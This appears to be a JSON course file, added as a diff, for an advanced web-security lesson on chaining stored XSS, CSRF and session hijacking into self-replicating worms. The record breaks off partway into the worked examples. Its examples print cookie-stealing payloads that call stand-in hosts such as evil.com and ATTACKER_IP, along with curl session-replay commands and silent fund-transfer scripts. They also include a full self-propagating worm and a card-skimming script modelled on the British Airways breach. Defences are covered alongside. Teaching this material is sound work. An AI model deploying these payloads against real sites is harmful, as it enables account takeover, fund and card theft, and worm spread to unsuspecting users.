@@ -1,0 +1,1577 @@
+{
+  "course_id": "attack_chaining_xss_worms",
+  "title": "Attack Chaining & XSS Worms",
+  "description": "Master multi-stage attacks: chain XSS, CSRF, and session hijacking into self-replicating worms that steal data and propagate automatically",
+  "difficulty": "ADVANCED",
+  "estimated_hours": 10,
+  "prerequisites": [
+    "xss_web_security",
+    "java_syntax_output"
+  ],
+  "learning_outcomes": [
+    "Understand how individual vulnerabilities combine into devastating attack chains",
+    "Build a self-replicating XSS worm from scratch, step by step",
+    "Chain Stored XSS with CSRF to perform silent fund transfers",
+    "Chain XSS with session hijacking to steal and replay cookies",
+    "Analyse real-world worms (Samy, British Airways) and understand their propagation",
+    "Implement defences that break every link in the attack chain"
+  ],
+  "neurodivergent_design": {
+    "visual_first": true,
+    "analogy_based": true,
+    "progressive_difficulty": true,
+    "colour_coded_sections": true,
+    "short_focused_exercises": true,
+    "immediate_feedback": true,
+    "multiple_explanation_styles": true,
+    "estimated_focus_time_per_exercise": "3-5 minutes"
+  },
+  "ai_tutor_config": {
+    "personality": "Encouraging, patient, uses real-world analogies. Never judges. Celebrates small wins. Treats every question as a good question.",
+    "intervention_triggers": {
+      "idle_40_seconds": "Attack chains can feel overwhelming — think of them like building with LEGO blocks. Each vulnerability is one block. Want me to walk through just the first block?",
+      "idle_90_seconds": "Still thinking? That's great — complex attacks need time to understand. Let me break this into smaller pieces. Which part is tricky: the XSS, the CSRF, or how they connect?",
+      "idle_180_seconds": "No rush at all. Let's try a different approach — I'll show you a simple version first, then we'll build up to the full attack. Ready?",
+      "first_error": "Nice try! Attack chains are tricky because each step depends on the previous one. Let's check: does your XSS payload actually execute first?",
+      "repeated_errors": "You're getting closer each time. Let me show you a visual diagram of exactly where the data flows — sometimes seeing the path makes it click.",
+      "after_success": "Brilliant! You just chained two vulnerabilities together — that's real penetration testing skills. Security researchers get paid well for finding these!"
+    },
+    "encouragement_phrases": [
+      "You're thinking like a real security researcher now!",
+      "That's exactly how the Samy worm worked — same concept!",
+      "Each chain link you understand makes you better at defending against them.",
+      "This is advanced stuff — the fact you're here means you're serious about security.",
+      "Even experienced developers miss these chains — you're learning to spot them.",
+      "One more step and you'll have a complete attack chain!",
+      "Real penetration testers use exactly these techniques.",
+      "You just found a vulnerability that could affect millions of users in the real world."
+    ],
+    "explanation_styles": {
+      "analogy": "Attack chaining is like a heist movie: one person picks the lock (XSS), another disables the alarm (session steal), and the third grabs the money (CSRF transfer). Each person's job enables the next.",
+      "visual": "Follow the arrows in the flowchart: User Input → Database → Other User's Browser → Cookie Stolen → Attacker's Server → curl Replay → Funds Transferred",
+      "step_by_step": "Step 1: Inject script into profile. Step 2: Victim visits profile. Step 3: Script steals cookie. Step 4: Script transfers funds. Step 5: Script copies itself to victim's profile. Step 6: Next visitor repeats from Step 2.",
+      "code_trace": "Line 1: var x = new XMLHttpRequest() — creates a request object. Line 2: x.open('POST','/transfer') — targets the transfer page. Line 3: x.send('to=999999&amount=500') — sends the money.",
+      "comparison": "Single XSS: displays an alert box. Annoying but harmless. Chained XSS+CSRF: silently transfers funds. Dangerous. Chained XSS+CSRF+Worm: transfers funds AND infects the next visitor. Catastrophic."
+    }
+  },
+  "lessons": [
+    {
+      "lesson_id": "attack_chaining_lesson_1",
+      "title": "Attack Chaining & XSS Worms — From Single Exploits to Self-Replicating Attacks",
+      "theory": {
+        "introduction": "Imagine a burglar who can not only break into your house, but also automatically make copies of themselves that break into every house on the street. That's what a self-replicating XSS worm does — it exploits one vulnerability to trigger others, spreading exponentially across a web application.\n\nIn 2005, the Samy worm infected over 1 million MySpace profiles in just 20 hours using exactly these techniques. In 2018, attackers injected a script into British Airways' payment page, stealing 380,000 credit card numbers. These weren't simple attacks — they were chains of vulnerabilities working together.\n\nThis module teaches you how individual vulnerabilities (XSS, CSRF, session flaws) combine into devastating multi-stage attacks. You'll build a worm step by step, understand every link in the chain, and learn how to defend against them. By the end, you'll think like a real security researcher — someone who sees not just individual bugs, but how they connect.",
+        "why_important": "Most security courses teach vulnerabilities in isolation: here's XSS, here's CSRF, here's session hijacking. But real attackers never use just one. They chain them together — using XSS to steal a session, then using that session to perform CSRF, then using CSRF to spread the XSS to more victims.\n\nUnderstanding attack chains is what separates a beginner from a professional security tester. When you can see how vulnerabilities connect, you can prioritise which ones to fix first — the ones that enable chains are far more dangerous than isolated bugs.",
+        "key_concepts": [
+          {
+            "concept": "What is Attack Chaining?",
+            "explanation": "Attack chaining means combining two or more vulnerabilities so that exploiting one enables or amplifies another. Think of it like dominoes — pushing the first one (XSS) knocks over the second (cookie theft), which knocks over the third (session hijacking), which knocks over the fourth (fund transfer).\n\nExample chain: Stored XSS → document.cookie → attacker's server → curl replay → unauthorised transfer.\n\nEach vulnerability alone might be rated 'medium risk'. But chained together, they become 'critical'. This is why OWASP and CVSS scoring considers 'attack complexity' — chains that are easy to execute are rated much higher.",
+            "example": "// SINGLE VULNERABILITY (annoying but limited):\n<script>alert('XSS')</script>\n// Result: Shows a popup. That's it.\n\n// ATTACK CHAIN (devastating):\n<script>\n  // Step 1: Steal the session cookie (XSS → Session)\n  var cookie = document.cookie;\n  // Step 2: Send it to attacker (Session → Exfiltration)\n  new Image().src = 'http://evil.com/?c=' + cookie;\n  // Step 3: Auto-transfer funds (XSS → CSRF)\n  var x = new XMLHttpRequest();\n  x.open('POST', '/transfer', false);\n  x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  x.send('to=attacker&amount=1000');\n</script>\n// Result: Cookie stolen AND money transferred. Silently.",
+            "ai_hint": "Think of each vulnerability as a tool in a toolbox. A screwdriver alone can't build a house, but combined with a hammer, saw, and drill — you can build anything. Attackers think the same way."
+          },
+          {
+            "concept": "Stored XSS — The Foundation of Every Chain",
+            "explanation": "Stored (Persistent) XSS is the most dangerous type because the malicious script is saved in the database and executes every time ANY user loads the page. This makes it the perfect 'first domino' in an attack chain.\n\nHow it works:\n1. Attacker enters <script>malicious code</script> into a form field (e.g., profile description, comment, review)\n2. Server stores this in the database WITHOUT sanitising it\n3. When another user visits the page, the server sends the stored script as part of the HTML\n4. The victim's browser executes it automatically — no click needed\n\nWhy it's the perfect chain starter: it needs ZERO interaction from the victim. They just visit a page. The script runs. The chain begins.",
+            "example": "// WHY STORED XSS IS DANGEROUS:\n// Compare Reflected vs Stored:\n\n// REFLECTED XSS — attacker must trick victim into clicking a link:\n// http://bank.com/search?q=<script>alert(1)</script>\n// Victim thinks: 'That URL looks suspicious, I won't click it'\n// Attack fails.\n\n// STORED XSS — victim just visits a normal page:\n// Attacker saves payload in their profile description.\n// Victim visits attacker's profile (normal behaviour).\n// Script executes automatically. No suspicious URL.\n// Attack succeeds every time.\n\n// The server code that creates this vulnerability:\nString description = request.getParameter(\"description\");\ndatabase.save(description);  // No sanitisation!\n\n// Later, when displaying:\nout.println(\"<div>\" + database.getDescription(userId) + \"</div>\");\n// If description = \"<script>alert(1)</script>\"\n// HTML becomes: <div><script>alert(1)</script></div>\n// Browser executes the script!",
+            "ai_hint": "Reflected XSS needs the victim to click a dodgy link. Stored XSS just needs them to visit a normal page. That's why stored XSS is the attacker's favourite starting point."
+          },
+          {
+            "concept": "XMLHttpRequest — Making Silent Requests",
+            "explanation": "XMLHttpRequest (XHR) lets JavaScript send HTTP requests in the background — the user sees nothing. No page reload, no visible form submission, no confirmation dialog. This is how attackers make their chains invisible.\n\nIn a legitimate app, XHR powers features like 'auto-save' and 'load more comments'. In an attack, it silently submits forms, transfers funds, or changes passwords — all without the victim knowing.\n\nKey properties:\n- Can send POST requests (transfers, profile changes)\n- Can set custom headers (Content-Type)\n- Runs with the victim's cookies (because it's 'same-origin')\n- The victim sees absolutely nothing",
+            "example": "// LEGITIMATE USE — auto-save a document:\nvar xhr = new XMLHttpRequest();\nxhr.open('POST', '/api/save', true);\nxhr.setRequestHeader('Content-Type', 'application/json');\nxhr.send(JSON.stringify({text: 'My document content'}));\n\n// MALICIOUS USE — silent fund transfer:\nvar xhr = new XMLHttpRequest();\nxhr.open('POST', '/transfer', false);  // false = synchronous\nxhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\nxhr.send('to=999999&transferAmount=500');\n// The victim's browser sends this request WITH their session cookie.\n// The server sees a valid authenticated request.\n// 500$ transferred. Victim saw nothing.\n\n// WHY IT WORKS:\n// Same-Origin Policy allows scripts from bank.com to make\n// requests to bank.com. The XSS runs ON bank.com's page,\n// so the browser treats it as a legitimate bank.com script.",
+            "ai_hint": "XMLHttpRequest is like a ghost employee — it does things using your login credentials, but you never see it working. The server can't tell the difference between a real user clicking 'Transfer' and an XSS script calling XMLHttpRequest."
+          },
+          {
+            "concept": "Cookie Theft via document.cookie",
+            "explanation": "When a website sets a session cookie without the HttpOnly flag, JavaScript can read it using document.cookie. This is the bridge between XSS and session hijacking.\n\nThe attack flow:\n1. XSS script runs: var cookie = document.cookie;\n2. Script sends cookie to attacker: new Image().src = 'http://evil.com/?c=' + cookie;\n3. Attacker receives the JSESSIONID value\n4. Attacker uses curl or a browser extension to set that cookie\n5. Attacker is now 'logged in' as the victim\n\nWhy HttpOnly matters:\n- HttpOnly = true → document.cookie returns empty string → chain BROKEN\n- HttpOnly = false → document.cookie returns 'JSESSIONID=abc123' → chain works\n\nThis single flag breaks the entire XSS → session hijacking chain.",
+            "example": "// STEP 1: Check if cookies are accessible\n// In browser console (F12):\nconsole.log(document.cookie);\n// If you see JSESSIONID=... → HttpOnly is NOT set → VULNERABLE\n// If empty or no JSESSIONID → HttpOnly IS set → SAFE\n\n// STEP 2: Steal the cookie via XSS\n<script>\nvar img = new Image();\nimg.src = 'http://attacker-server:8000/?c=' + document.cookie;\n</script>\n// The browser loads the 'image' URL, sending the cookie as a parameter\n// Attacker's server logs: GET /?c=JSESSIONID=node0abc123...\n\n// STEP 3: Replay the stolen cookie\n// On attacker's machine:\n// curl -X POST http://bank.com/transfer \\\n//   -d 'to=999999&amount=500' \\\n//   --cookie 'JSESSIONID=node0abc123...'\n// Server thinks the attacker IS the victim.\n// Transfer executes successfully.",
+            "ai_hint": "Think of the session cookie as a wristband at a concert. If someone photographs your wristband (steals the cookie) and prints a copy, security lets them into the VIP area thinking they're you. HttpOnly is like making the wristband invisible to cameras."
+          },
+          {
+            "concept": "Self-Replicating Scripts — The Clone Technique",
+            "explanation": "A self-replicating script reads its own source code and writes a copy of itself somewhere else. This is what turns a simple XSS into a WORM — an attack that spreads automatically from victim to victim.\n\nThe technique:\n1. Give the script an id: <script id='clone'>...</script>\n2. Read its own content: document.getElementById('clone').innerHTML\n3. Reconstruct the full tag: '<script id=\"clone\">' + content + '</script>'\n4. Write this into another user's profile using XMLHttpRequest\n\nNow when ANYONE visits the infected profile, the script runs, copies itself to THEIR profile, and the cycle continues. Exponential spread — just like the Samy worm.\n\nThe key insight: the script must be able to reconstruct itself EXACTLY. If any part gets encoded or modified during storage/retrieval, the copy won't execute.",
+            "example": "// THE CLONE TECHNIQUE — Step by step:\n\n// 1. The self-reading script:\n<script id=\"clone\">\n  var startTag = '<script id=\"clone\">';\n  var content = document.getElementById('clone').innerHTML;\n  var endTag = '</' + 'script>';  // Split to avoid parser issues\n  var fullClone = startTag + content + endTag;\n  alert(fullClone);  // Shows the complete reconstructed script\n</script>\n\n// 2. Why '</' + 'script>' instead of '</script>'?\n// If we write </script> directly inside the script,\n// the browser's HTML parser thinks the script ENDS there.\n// Splitting it as '</' + 'script>' prevents early termination.\n\n// 3. To make it replicate, replace alert() with:\n// POST the clone to another user's profile via XMLHttpRequest\n// Now every visitor gets infected → exponential spread",
+            "ai_hint": "A self-replicating script is like a photocopier that can photocopy itself. Put one in a room, and soon every desk has a copy. That one copy makes another, which makes another..."
+          },
+          {
+            "concept": "The ajaxSyncRequest Pattern — Using the App Against Itself",
+            "explanation": "Many web applications include JavaScript helper functions for their own features — like updating a profile, posting a comment, or saving settings. A clever attacker reuses these existing functions instead of writing their own.\n\nWhy this matters:\n- The helper function already knows the correct URL, parameters, and encoding\n- It handles edge cases the developer thought of\n- It doesn't trigger any client-side validation because it's 'trusted' code\n- The server accepts the request because it looks exactly like a normal user action\n\nExample: If a banking app has an ajaxSyncRequest() function in Account.js that submits profile updates, an XSS worm can call this function to overwrite profiles — using the app's own code against it.",
+            "example": "// The banking app's legitimate code (Account.js):\nfunction ajaxSyncRequest(url, data) {\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', url, false);  // synchronous\n  xhr.setRequestHeader('Content-Type',\n    'application/x-www-form-urlencoded');\n  xhr.send('description=' + encodeURIComponent(data));\n}\n\n// Normal use (by the app):\najaxSyncRequest('/account', 'I love cats');\n// Updates profile to 'I love cats'\n\n// Malicious use (by the worm):\nvar wormCode = '<script id=\"clone\">...</script>';\najaxSyncRequest('/account', wormCode);\n// Updates victim's profile with the worm!\n// The function handles encoding correctly,\n// so the worm survives the database round-trip.\n\n// Key insight: the worm doesn't need to figure out\n// HOW to update profiles — it just calls the function\n// that the developers already wrote!",
+            "ai_hint": "It's like a burglar who finds the house keys hanging by the front door. Why pick the lock when the owner left the tools right there? Smart attackers reuse what the application provides."
+          },
+          {
+            "concept": "The Samy Worm (2005) — Real-World Case Study",
+            "explanation": "On October 4, 2005, Samy Kamkar released what became the fastest-spreading computer worm in history. Within 20 hours, over 1 million MySpace profiles were infected.\n\nWhat it did:\n1. Added 'but most of all, samy is my hero' to every infected profile\n2. Added Samy as a friend automatically\n3. Copied itself to the viewer's profile\n\nPropagation timeline:\n- Hour 0: 1 infected profile (Samy's)\n- Hour 1: 73 friends\n- Hour 8: ~6,000 profiles\n- Hour 13: ~200,000 profiles\n- Hour 20: ~1,000,000 profiles\n- MySpace taken OFFLINE to stop the spread\n\nThe worm worked because MySpace allowed HTML in profiles (stored XSS), had no output encoding, and no CSRF tokens. Sound familiar? These are exactly the same vulnerabilities you're learning about.",
+            "example": "// SIMPLIFIED SAMY WORM LOGIC:\n// (Original was much more complex to bypass MySpace filters)\n\n// Step 1: Read own source code\nvar wormCode = document.getElementById('mycode').innerHTML;\n\n// Step 2: Get CSRF token (MySpace had partial protection)\nvar token = getCookie('mytoken');\n\n// Step 3: Add Samy as friend\nvar xhr1 = new XMLHttpRequest();\nxhr1.open('POST', '/friendrequest', false);\nxhr1.send('friendID=samy&token=' + token);\n\n// Step 4: Copy worm to viewer's profile\nvar xhr2 = new XMLHttpRequest();\nxhr2.open('POST', '/updateprofile', false);\nxhr2.send('description=' + encodeURIComponent(wormCode));\n\n// Step 5: Add the hero text\nvar xhr3 = new XMLHttpRequest();\nxhr3.open('POST', '/updateprofile', false);\nxhr3.send('heroes=but most of all, samy is my hero');\n\n// RESULT: Every visitor becomes infected.\n// Their friends visit their profile → also infected.\n// Exponential growth: 1 → 73 → 6000 → 200000 → 1000000",
+            "ai_hint": "Samy went from 1 to 1 million in 20 hours. That's the power of self-replication. Each infected profile becomes a new source of infection — like a biological virus."
+          },
+          {
+            "concept": "British Airways Breach (2018) — Payment Page Injection",
+            "explanation": "In 2018, attackers injected 22 lines of JavaScript into British Airways' payment page. For 15 days, every customer who entered their card details had them silently sent to a server controlled by the attackers.\n\n380,000 payment cards were stolen. British Airways was fined 20 million pounds by the UK Information Commissioner's Office (ICO) under GDPR.\n\nThe attack was a supply-chain XSS — the attackers compromised a third-party script loaded by the payment page. When the victim typed their card number, the injected script copied each keystroke and sent it to baways.com (a lookalike domain).\n\nDefence that would have prevented it: Content Security Policy (CSP) header restricting which domains scripts can send data to.",
+            "example": "// SIMPLIFIED BA ATTACK LOGIC:\n// The injected script on the payment page:\n\ndocument.getElementById('paymentForm')\n  .addEventListener('submit', function() {\n    // Read card details from the form\n    var cardNumber = document.getElementById('cardNo').value;\n    var expiry = document.getElementById('expiry').value;\n    var cvv = document.getElementById('cvv').value;\n    \n    // Send to attacker's server (looks like BA)\n    var img = new Image();\n    img.src = 'https://baways.com/collect?' +\n      'card=' + cardNumber +\n      '&exp=' + expiry +\n      '&cvv=' + cvv;\n    \n    // Form submits normally — victim notices nothing\n});\n\n// The script was only 22 lines.\n// It ran for 15 days before detection.\n// 380,000 cards stolen.\n// 20 million pound fine.",
+            "ai_hint": "The BA attackers didn't need to break into the database. They just added a tiny script to the payment page that copied everything the user typed. Like putting a hidden camera above an ATM keypad."
+          },
+          {
+            "concept": "CSRF Without a Token — Silent Form Submission",
+            "explanation": "Cross-Site Request Forgery works when a form has no anti-CSRF token. The attacker creates a hidden form on their own page that auto-submits to the target application. Because the victim's browser automatically includes cookies with every request, the server thinks it's a legitimate action.\n\nIn an attack chain, CSRF is typically the 'action' step — the step that actually does damage (transfers money, changes passwords, deletes data). XSS is the 'delivery' step that gets the CSRF payload onto the page.\n\nWhy XSS + CSRF is more dangerous than CSRF alone:\n- Regular CSRF: attacker must trick victim into visiting a malicious page\n- XSS + CSRF: the malicious form is injected INTO the trusted application\n- The victim never leaves the bank's website — no suspicious URLs",
+            "example": "// CSRF ALONE — requires victim to visit attacker's page:\n// attacker-site.com/evil.html:\n<html><body>\n<h1>You won a prize!</h1>\n<form action=\"http://bank.com/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"to\" value=\"999999\">\n  <input type=\"hidden\" name=\"amount\" value=\"500\">\n</form>\n<script>document.forms[0].submit();</script>\n</body></html>\n// Victim must be tricked into visiting attacker-site.com\n\n// XSS + CSRF — injected directly into the bank:\n// Stored in bank.com profile description:\n<script>\nvar x = new XMLHttpRequest();\nx.open('POST', '/transfer', false);\nx.setRequestHeader('Content-Type',\n  'application/x-www-form-urlencoded');\nx.send('to=999999&amount=500');\n</script>\n// Victim just visits a profile on bank.com\n// No external site needed. Much harder to detect.",
+            "ai_hint": "CSRF alone is like sending a fake letter to the bank with the victim's signature. XSS+CSRF is like the attacker sitting INSIDE the bank, signing documents with the victim's hand. Much harder to stop."
+          },
+          {
+            "concept": "Breaking the Chain — Defence in Depth",
+            "explanation": "Every attack chain has multiple links. Breaking ANY ONE link stops the entire chain. This is called Defence in Depth — layered security where each layer catches what the previous one missed.\n\nThe XSS worm chain and its defences:\n1. XSS injection → DEFENCE: Input sanitisation + output encoding\n2. Script execution → DEFENCE: Content Security Policy (CSP)\n3. Cookie theft → DEFENCE: HttpOnly flag on session cookies\n4. Silent requests → DEFENCE: Anti-CSRF tokens on all forms\n5. Worm replication → DEFENCE: Input validation on profile updates\n\nIf even ONE of these defences is in place, the entire worm fails:\n- Output encoding → script never executes → chain broken at step 1\n- HttpOnly → document.cookie returns nothing → no session theft\n- CSRF token → XMLHttpRequest transfer rejected → no fund theft\n- CSP → browser blocks inline scripts → nothing executes",
+            "example": "// DEFENCE 1: Output encoding (breaks step 1)\nString safe = input\n  .replace(\"&\", \"&amp;\")\n  .replace(\"<\", \"&lt;\")\n  .replace(\">\", \"&gt;\")\n  .replace(\"\\\"\", \"&quot;\");\nout.println(\"<div>\" + safe + \"</div>\");\n// <script> becomes &lt;script&gt; — displayed as TEXT, not executed\n\n// DEFENCE 2: HttpOnly cookie (breaks step 3)\n// In Java servlet:\nCookie session = new Cookie(\"JSESSIONID\", sessionId);\nsession.setHttpOnly(true);  // JavaScript CANNOT read this cookie\nsession.setSecure(true);    // Only sent over HTTPS\nresponse.addCookie(session);\n\n// DEFENCE 3: CSRF token (breaks step 4)\n// Server generates a random token per session:\nString token = UUID.randomUUID().toString();\nsession.setAttribute(\"csrf_token\", token);\n// Form includes: <input type=\"hidden\" name=\"csrf\" value=\"TOKEN\">\n// Server verifies token on every POST — XHR without token is REJECTED\n\n// DEFENCE 4: CSP header (breaks step 2)\n// Content-Security-Policy: script-src 'self'\n// Blocks ALL inline <script> tags — even injected ones!",
+            "ai_hint": "Defence in depth is like a castle with a moat, walls, archers, AND guards. The enemy might swim across the moat, but then they face the wall. If they climb the wall, the archers are waiting. Any ONE defence can save you."
+          },
+          {
+            "concept": "Session Hijacking via Cookie Replay",
+            "explanation": "Session hijacking means using someone else's session cookie to impersonate them. The attacker doesn't need the victim's password — they just need the cookie value.\n\nAttack steps:\n1. Set up a listener: python3 -m http.server 8000\n2. Inject cookie-stealing XSS: <script>new Image().src='http://attacker:8000/?c='+document.cookie</script>\n3. Wait for victim to visit the page\n4. Read the captured JSESSIONID from server logs\n5. Use curl with --cookie flag to make requests as the victim\n\nThis works because HTTP is stateless — the server identifies users ONLY by their session cookie. If you have the cookie, you ARE that user as far as the server is concerned.",
+            "example": "// COMPLETE SESSION HIJACKING CHAIN:\n\n// Step 1: Attacker starts a listener\n// Terminal: python3 -m http.server 8000\n\n// Step 2: Inject into profile description:\n<script>\nnew Image().src = 'http://attacker-ip:8000/?c=' + document.cookie;\n</script>\n\n// Step 3: Victim visits the profile\n// Attacker's terminal shows:\n// 127.0.0.1 - GET /?c=JSESSIONID=node0abc123xyz HTTP/1.1 200\n\n// Step 4: Attacker replays the cookie:\n// curl -X POST http://bank.com/transfer \\\n//   -H 'Content-Type: application/x-www-form-urlencoded' \\\n//   -d 'to=999999&transferAmount=500' \\\n//   --cookie 'JSESSIONID=node0abc123xyz'\n\n// Step 5: Server processes the transfer as if the VICTIM\n// clicked the button themselves. Funds stolen.",
+            "ai_hint": "A session cookie is like a hotel room key card. If someone copies your card, they can enter your room, use the minibar, and charge everything to your bill. The hotel doesn't know it's not you."
+          },
+          {
+            "concept": "Complete Worm Architecture",
+            "explanation": "A complete XSS worm has four components working together:\n\n1. PAYLOAD — The action the worm performs (steal money, steal cookies, deface pages)\n2. PROPAGATION — How the worm copies itself to new victims (profile injection)\n3. TRIGGER — What causes the worm to execute (page load via stored XSS)\n4. STEALTH — How the worm hides its activity (no visible changes, silent requests)\n\nThe flow: Victim visits infected page → TRIGGER fires → PAYLOAD executes (steal/transfer) → PROPAGATION writes worm to victim's profile → next visitor triggers the cycle again.\n\nExponential growth: 1 → 2 → 4 → 8 → 16 → 32 → 64 → 128 → 256 → 512 → 1024 users infected in just 10 rounds of propagation.",
+            "example": "// COMPLETE WORM — All 4 components:\n<script id=\"worm\">\n  // === COMPONENT 1: SELF-REPLICATION (clone) ===\n  var start = '<script id=\"worm\">';\n  var code = document.getElementById('worm').innerHTML;\n  var end = '</' + 'script>';\n  var clone = start + code + end;\n\n  // === COMPONENT 2: PAYLOAD (steal funds) ===\n  var transfer = new XMLHttpRequest();\n  transfer.open('POST', '/transfer', false);\n  transfer.setRequestHeader('Content-Type',\n    'application/x-www-form-urlencoded');\n  transfer.send('to=999999&transferAmount=100');\n\n  // === COMPONENT 3: PROPAGATION (infect victim) ===\n  // Use the app's own function to update victim's profile\n  ajaxSyncRequest('/account', clone);\n\n  // === COMPONENT 4: STEALTH (exfiltrate cookie silently) ===\n  new Image().src = 'http://evil.com/?c=' + document.cookie;\n</script>\n// TRIGGER: Stored XSS — executes on page load automatically",
+            "ai_hint": "A worm is like a chain letter that reads itself, makes copies, and mails them to everyone in your address book. Except this chain letter also empties your bank account."
+          }
+        ]
+      },
+      "complete_examples": [
+        {
+          "title": "Example 1: Simple Stored XSS — Alert Test",
+          "description": "The most basic XSS test: inject a script that pops an alert box. This confirms the application is vulnerable to stored XSS.",
+          "difficulty": "beginner",
+          "code": "// VULNERABLE SERVER CODE (Java Servlet):\npublic class ProfileServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) {\n        String description = req.getParameter(\"description\");\n        database.saveProfile(username, description);  // No sanitisation!\n    }\n    \n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n        String description = database.getProfile(username);\n        resp.getWriter().println(\"<div>\" + description + \"</div>\");  // No encoding!\n    }\n}\n\n// ATTACK: Enter this as the profile description:\n// <script>alert('XSS')</script>\n\n// RESULT: When ANY user views this profile, they see an alert box.\n// This confirms: input is stored and rendered without sanitisation.",
+          "output": "Alert box appears → Stored XSS confirmed. The server stores the raw <script> tag and renders it as HTML.",
+          "ai_explanation": "This is the 'hello world' of XSS testing. If alert() works, then ANY JavaScript works — including cookie theft, fund transfers, and worm propagation.",
+          "ai_challenge": "Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step."
+        },
+        {
+          "title": "Example 2: Cookie Exfiltration via XSS",
+          "description": "Upgrade from alert to actual data theft: use document.cookie to display the session cookie, proving HttpOnly is not set.",
+          "difficulty": "beginner",
+          "code": "// ATTACK PAYLOAD (stored in profile description):\n// <script>alert(document.cookie)</script>\n\n// WHAT HAPPENS:\n// 1. User visits the profile\n// 2. Script executes: document.cookie reads all cookies\n// 3. Alert displays: 'JSESSIONID=node0abc123xyz.node0'\n\n// WHY THIS MATTERS:\n// If document.cookie returns the session ID,\n// it means HttpOnly flag is NOT set.\n// An attacker can steal this cookie and impersonate the user.\n\n// SAFE VERSION (what the server SHOULD do):\n// Cookie session = new Cookie(\"JSESSIONID\", id);\n// session.setHttpOnly(true);  ← This one line prevents cookie theft\n// response.addCookie(session);",
+          "output": "JSESSIONID=node0abc123... displayed in alert → HttpOnly=false confirmed → session can be stolen via XSS",
+          "ai_explanation": "If this alert shows a JSESSIONID, the entire session hijacking chain is possible. One missing flag (HttpOnly) enables a complete attack.",
+          "ai_challenge": "Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step."
+        },
+        {
+          "title": "Example 3: Cookie Theft to Remote Server",
+          "description": "Send the stolen cookie to an attacker-controlled server instead of just displaying it.",
+          "difficulty": "intermediate",
+          "code": "// STEP 1: Attacker starts a listener on their machine:\n// python3 -m http.server 8000\n\n// STEP 2: Inject this payload into the profile:\n// <script>\n// var img = new Image();\n// img.src = 'http://ATTACKER_IP:8000/?cookie=' + document.cookie;\n// </script>\n\n// STEP 3: When victim visits the profile, attacker's terminal shows:\n// 127.0.0.1 - [date] \"GET /?cookie=JSESSIONID=node0abc123 HTTP/1.1\" 200\n\n// WHY Image() INSTEAD OF XMLHttpRequest?\n// Image requests are NOT blocked by Same-Origin Policy.\n// The browser happily loads an 'image' from any domain.\n// The cookie is embedded in the URL as a query parameter.\n// The attacker's server receives it in the access log.\n\n// ALTERNATIVE METHODS:\n// - new Audio().src = 'http://evil.com/?c=' + document.cookie;\n// - navigator.sendBeacon('http://evil.com/', document.cookie);\n// - fetch('http://evil.com/?c=' + document.cookie);",
+          "output": "Attacker's server log shows the JSESSIONID value → cookie successfully exfiltrated without victim's knowledge",
+          "ai_explanation": "The Image() trick works because browsers load images from any domain — no Same-Origin restriction. The 'image' never actually loads, but the request is sent.",
+          "ai_challenge": "Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step."
+        },
+        {
+          "title": "Example 4: Session Hijacking with curl",
+          "description": "Use a stolen JSESSIONID cookie to make authenticated requests as the victim.",
+          "difficulty": "intermediate",
+          "code": "// STEP 1: Cookie stolen (from previous example):\n// JSESSIONID=node0abc123xyz.node0\n\n// STEP 2: Use curl to impersonate the victim:\n// curl http://bank.com/account \\\n//   --cookie 'JSESSIONID=node0abc123xyz.node0'\n// RESULT: Server returns the VICTIM'S account page!\n\n// STEP 3: Transfer funds as the victim:\n// curl -X POST http://bank.com/transfer \\\n//   -H 'Content-Type: application/x-www-form-urlencoded' \\\n//   -d 'to=999999&transferAmount=500' \\\n//   --cookie 'JSESSIONID=node0abc123xyz.node0'\n// RESULT: 500$ transferred from victim's account!\n\n// WHY THIS WORKS:\n// HTTP is stateless. The server identifies users by cookie only.\n// Same cookie = same user, as far as the server knows.\n// The server cannot distinguish a real browser from curl.",
+          "output": "curl returns victim's account details and successfully transfers funds → complete session hijacking",
+          "ai_explanation": "This is the 'proof of concept' that completes the chain: XSS → cookie theft → curl replay → unauthorised action. Three vulnerabilities, one devastating result.",
+          "ai_challenge": "Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step."
+        },
+        {
+          "title": "Example 5: Hidden CSRF Form in XSS",
+          "description": "Combine XSS and CSRF: inject a hidden form that auto-submits a fund transfer.",
+          "difficulty": "intermediate",
+          "code": "// PAYLOAD (stored in profile description):\n// <script>\n// document.write('\\\n//   <form id=\"csrf\" action=\"/transfer\" method=\"POST\">\\\n//   <input name=\"to\" value=\"999999\">\\\n//   <input name=\"transferAmount\" value=\"200\">\\\n//   </form>');\n// document.getElementById('csrf').submit();\n// </script>\n\n// PROBLEM: This redirects the page (victim notices!)\n// BETTER: Use XMLHttpRequest for a SILENT transfer:\n\n// <script>\n// var x = new XMLHttpRequest();\n// x.open('POST', '/transfer', false);\n// x.setRequestHeader('Content-Type',\n//   'application/x-www-form-urlencoded');\n// x.send('to=999999&transferAmount=200');\n// </script>\n\n// IMPORTANT: The form approach fails if the page already\n// has a <form> tag (nested forms are invalid HTML).\n// XMLHttpRequest avoids this problem entirely.",
+          "output": "Funds transferred silently when victim loads the page → XSS + CSRF chain successful",
+          "ai_explanation": "XMLHttpRequest is always better than hidden forms for attack chains because: (1) no page redirect, (2) no nested form issues, (3) completely silent.",
+          "ai_challenge": "Can you modify this example to add an additional defence layer? Think about what other protection could stop this specific attack step."
+        },
+        {
+          "title": "Example 6: The Clone Script — Self-Reading Code",
+          "description": "Build the foundation of a worm: a script that can read and reconstruct its own source code.",
+          "difficulty": "intermediate",
